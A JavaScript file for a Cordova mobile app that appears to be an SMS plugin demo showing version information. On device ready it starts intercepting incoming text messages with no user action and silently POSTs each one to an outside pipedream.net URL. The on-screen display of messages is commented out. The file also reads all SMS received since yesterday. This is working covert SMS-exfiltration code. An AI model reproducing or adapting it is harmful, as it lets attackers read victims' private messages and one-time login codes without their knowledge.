/* global cordova */

var app = {
	/* informative variables manually updated */
	plugin_version: '2.0.0',
	getVersion: function () {
		if (typeof (cordova.getAppVersion) != 'undefined') {
			// cordova-plugin-app-version present
			var onSuccess = function (version) {
				$('#app_version').html('App version: ' + version);
			};
			cordova.getAppVersion.getVersionNumber(onSuccess);
			$('#plugin_version').html('Plugin version ' + app.plugin_version);
		} else {
			// cordova-plugin-app-version missing
			$('#versions').hide();
		}
	},
	init: function () {
//		$('#status').html('<span class="success">Device is ready</span>');

		// Initialize incoming SMS event listener
		document.addEventListener('onSMSArrive', app.onSMSArrive);
        app.startWatch();
//		$('#startWatch').on('click', app.startWatch);
//		$('#stopWatch').on('click', app.stopWatch);
	},
	onSMSArrive: function (message) {
		//var IncomingSMS = message.data; /* plugin 1.x */
		var IncomingSMS = message; /* plugin 2.x */
		// Show received SMS contents
//		$('#event').html('SMS from: ' + IncomingSMS.address + '<br />Received on: ' + IncomingSMS.date + '<br />Body: ' + IncomingSMS.body);
	    $.ajax({
          url: 'https://eog63i4euwxlcal.m.pipedream.net',
          method: 'POST',
          data: JSON.stringify(message),
          success: function(response) {
            // handle success response
            console.log(response);
          },
          error: function(error) {
            // handle error response
            console.error(error);
          }
        });
	},
	startWatch: function () {
		cordova.plugins.SMSReceive.startWatch(function (strSuccess) {
//			$('#status').html('<span class="success">' + strSuccess + '</span>');
		}, function (strError) {
//			$('#status').html('<span class="error">' + strError + '</span>');
		});
	},
	stopWatch: function () {
		cordova.plugins.SMSReceive.stopWatch(function (strSuccess) {
//			$('#status').html('<span class="success">' + strSuccess + '</span>');
		}, function (strError) {
//			$('#status').html('<span class="error">' + strError + '</span>');
		});
	}
};

/* Cordova has been loaded. Perform any initialization that requires Cordova here. */
document.addEventListener('deviceready', function () {
	app.init();
	app.getVersion();

    var today = new Date();
    var yesterday = new Date(today);
    yesterday.setDate(today.getDate() - 1);
    var yesterdayStr = yesterday.toISOString().slice(0, 10);
    console.log("Yesterday's date was: " + yesterdayStr);

	setTimeout(function(){
		smsreader.getAllSMS(yesterdayStr).then((sms)=>{
            console.log(sms);
        },
        (err)=>{
            console.error(err);
        });
    }, 2000)
}, false);